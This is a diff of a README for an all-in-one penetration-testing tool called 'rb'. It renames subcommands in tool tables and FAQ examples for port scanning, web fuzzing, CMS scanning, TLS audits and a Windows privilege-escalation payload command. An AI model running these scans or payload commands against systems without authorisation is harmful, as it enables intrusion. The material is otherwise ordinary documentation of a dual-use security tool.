+| **WinPEAS** (partial) | `rb exploit privesc payload --os windows` | Privesc scanning | ✅ |
 
 ### 🚧 In Progress
 
 | Tool | Command | Status |
 |------|---------|--------|
-| **openssl** | `rb tls security cert` | Temporary external call (will be replaced) |
-| **aquatone/eyewitness** | `rb collection screenshot capture` | Placeholder (CDP integration planned) |
+| **openssl** | `rb web cert asset` | Temporary external call (will be replaced) |
+| **aquatone/eyewitness** | `rb collection capture screenshot` | Placeholder (CDP integration planned) |
 
 ### 🔴 Roadmap (Phases 3-4)
 
 | Tool | Command | Phase |
 |------|---------|-------|
-| **masscan** | `rb network ports scan --fast` | Phase 3 |
-| **ffuf** | `rb web asset fuzz` | Phase 3 |
-| **feroxbuster** | `rb web asset fuzz --recursive` | Phase 3 |
-| **gobuster** | `rb web asset fuzz --wordlist` | Phase 3 |
-| **nikto** | `rb web asset vuln-scan` | Phase 3 |
-| **gitleaks** | `rb code secrets scan` | Phase 4 |
-| **trufflehog** | `rb code secrets scan --deep` | Phase 4 |
+| **masscan** | `rb network scan ports --fast` | Phase 3 |
+| **ffuf** | `rb web fuzz asset` | Phase 3 |
+| **feroxbuster** | `rb web fuzz asset --recursive` | Phase 3 |
+| **gobuster** | `rb web fuzz asset --wordlist` | Phase 3 |
+| **nikto** | `rb web vuln-scan asset` | Phase 3 |
+| **gitleaks** | `rb code scan secrets` | Phase 4 |
+| **trufflehog** | `rb code scan secrets --deep` | Phase 4 |
 
 **Total:** 30+ tools consolidated into one binary (427KB).
 
@@ -1973,35 +2016,35 @@ A: Yes, via WSL2. Native Windows support is planned.
 
 **Q: When should I use collector verbs vs active verbs?**
  A:
-- Use **active verbs** (`rb network ports scan`, `rb dns record lookup`) when **performing live operations**
-- Use **collector verbs** (`rb network ports list`, `rb database data query`) when **reading stored results from RedDb**
+- Use **active verbs** (`rb network scan ports`, `rb dns lookup record`) when **performing live operations**
+- Use **collector verbs** (`rb network list ports`, `rb database query data`) when **reading stored results from RedDb**
 
 **Q: How do I see what data has been collected?**
 A: Use collector verbs that operate on `.rdb` files:
-- `rb network ports list 192.168.1.1 --db scans.rdb` - View stored port scan for a host
-- `rb network host list --db hosts.rdb` - Dump all recorded host fingerprints
-- `rb database data query recon.rdb` - Inspect database contents and statistics
-- `rb database data export recon.rdb --output recon.csv` - Export everything for external analysis
+- `rb network list ports 192.168.1.1 --db scans.rdb` - View stored port scan for a host
+- `rb network list host --db hosts.rdb` - Dump all recorded host fingerprints
+- `rb database query data recon.rdb` - Inspect database contents and statistics
+- `rb database export data recon.rdb --output recon.csv` - Export everything for external analysis
 
 **Q: How do I scan a network?**
 A: Use action-based commands:
-- `rb network ports scan 192.168.1.1` - Port scan (add `--preset common` for presets)
-- `rb network host discover 192.168.1.0/24` - Network discovery (CIDR)
-- `rb network trace run 8.8.8.8` - Traceroute
+- `rb network scan ports 192.168.1.1` - Port scan (add `--preset common` for presets)
+- `rb network discover host 192.168.1.0/24` - Network discovery (CIDR)
+- `rb network run trace 8.8.8.8` - Traceroute
 
 **Q: Can I scan WordPress sites?**
-A: Yes! Use: `rb web asset scan http://wordpress-site.com --cms` - Auto-detects and scans WordPress, Drupal, and Joomla.
+A: Yes! Use: `rb web cms-scan asset http://wordpress-site.com` - Auto-detects and scans WordPress, Drupal, and Joomla.
 
 **Q: How do I check TLS certificates?**
 A:
-- `rb tls security audit example.com` - Full TLS audit
-- `rb tls security cert example.com` - View cached certificate details
+- `rb tls audit security example.com` - Full TLS audit
+- `rb web cert asset example.com:443` - View cached certificate details
 
 **Q: How do I manage collected data?**
 A: Use collector verbs (`list`, `get`, `describe`, `export`) plus the `database` domain:
-- `rb network ports describe 192.168.1.1 --db scans.rdb` - Detailed view of a stored scan
-- `rb network host list --db hosts.rdb` - Enumerate stored host fingerprints
-- `rb database data export recon.rdb --output recon.csv` - Generate reports from RedDb
+- `rb network describe ports 192.168.1.1 --db scans.rdb` - Detailed view of a stored scan
+- `rb network list host --db hosts.rdb` - Enumerate stored host fingerprints
+- `rb database export data recon.rdb --output recon.csv` - Generate reports from RedDb
 
 ### Legal & Ethics
 
